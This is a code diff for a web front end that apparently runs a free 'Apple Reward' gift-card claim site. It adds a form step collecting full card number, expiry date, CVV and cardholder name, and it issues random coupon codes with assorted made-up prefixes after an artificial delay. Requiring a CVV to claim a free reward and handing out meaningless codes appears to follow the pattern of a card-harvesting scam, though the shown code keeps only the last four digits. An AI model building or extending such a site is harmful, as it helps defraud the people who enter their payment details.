@@ -38,6 +38,88 @@ function setupMobileMenu() {
   }
 }
 
+// Card Validation Function
+function validateCard(cardNumber, expiry, cvv, name) {
+  // Validate card number (16 digits)
+  if (!/^\d{16}$/.test(cardNumber)) {
+    app.showToast('Invalid card number. Must be 16 digits.', 'error');
+    return false;
+  }
+  
+  // Validate expiry (MM/YY)
+  if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+    app.showToast('Invalid expiry date. Use MM/YY format.', 'error');
+    return false;
+  }
+  
+  // Check if card is expired
+  const [month, year] = expiry.split('/');
+  const expiryDate = new Date(2000 + parseInt(year), parseInt(month) - 1);
+  if (expiryDate < new Date()) {
+    app.showToast('Card has expired.', 'error');
+    return false;
+  }
+  
+  // Validate CVV (3-4 digits)
+  if (!/^\d{3,4}$/.test(cvv)) {
+    app.showToast('Invalid CVV. Must be 3-4 digits.', 'error');
+    return false;
+  }
+  
+  // Validate cardholder name
+  if (name.trim().length < 2) {
+    app.showToast('Invalid cardholder name.', 'error');
+    return false;
+  }
+  
+  return true;
+}
+
+// Format card number with spaces
+function formatCardNumber(value) {
+  const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+  const matches = v.match(/\d{4,16}/g);
+  const match = matches && matches[0] || '';
+  const parts = [];
+  
+  for (let i = 0, len = match.length; i < len; i += 4) {
+    parts.push(match.substring(i, i + 4));
+  }
+  
+  if (parts.length) {
+    return parts.join(' ');
+  } else {
+    return v;
+  }
+}
+
+// Format expiry date
+function formatExpiry(value) {
+  const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+  if (v.length >= 2) {
+    return v.substring(0, 2) + '/' + v.substring(2, 4);
+  }
+  return v;
+}
+
+// Add input formatting
+document.addEventListener('DOMContentLoaded', () => {
+  const cardNumberInput = document.getElementById('claim-card-number');
+  const cardExpiryInput = document.getElementById('claim-card-expiry');
+  
+  if (cardNumberInput) {
+    cardNumberInput.addEventListener('input', (e) => {
+      e.target.value = formatCardNumber(e.target.value);
+    });
+  }
+  
+  if (cardExpiryInput) {
+    cardExpiryInput.addEventListener('input', (e) => {
+      e.target.value = formatExpiry(e.target.value);
+    });
+  }
+});
+
 // Update Navbar and Footer based on login status
 function updateNavbar() {
   const navLinks = document.getElementById('nav-links');
@@ -205,12 +287,27 @@ function setupClaimForm() {
     
     const user = JSON.parse(localStorage.getItem('giftcard_user'));
     
+    // Validate card information
+    const cardType = document.getElementById('claim-card-type').value;
+    const cardNumber = document.getElementById('claim-card-number').value.replace(/\s/g, '');
+    const cardExpiry = document.getElementById('claim-card-expiry').value;
+    const cardCvv = document.getElementById('claim-card-cvv').value;
+    const cardName = document.getElementById('claim-card-name').value;
+    
+    // Card validation
+    if (!validateCard(cardNumber, cardExpiry, cardCvv, cardName)) {
+      app.setLoading(btn, false);
+      return;
+    }
+    
     const claimData = {
       user_id: user.id,
       reward_id: document.getElementById('reward-id').value,
       full_name: document.getElementById('claim-name').value,
       email: document.getElementById('claim-email').value,
       country: document.getElementById('claim-country').value,
+      card_type: cardType,
+      card_last4: cardNumber.slice(-4),
       status: 'processing'
     };
     
@@ -256,7 +353,11 @@ function setupClaimForm() {
     setTimeout(async () => {
       const reward = await app.getRewardById ? await app.getRewardById(claimData.reward_id) : { success: true, data: { name: 'Apple Reward', icon: '🍎' } };
       
-      const code = 'APL-' + Math.random().toString(36).substring(2, 8).toUpperCase();
+      // Generate random coupon code
+      const prefixes = ['APL', 'GFT', 'RWD', 'PRM', 'VIP'];
+      const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+      const randomPart = Math.random().toString(36).substring(2, 8).toUpperCase();
+      const code = prefix + '-' + randomPart;
       
       await app.createCoupon({
         claim_id: result.data.id,
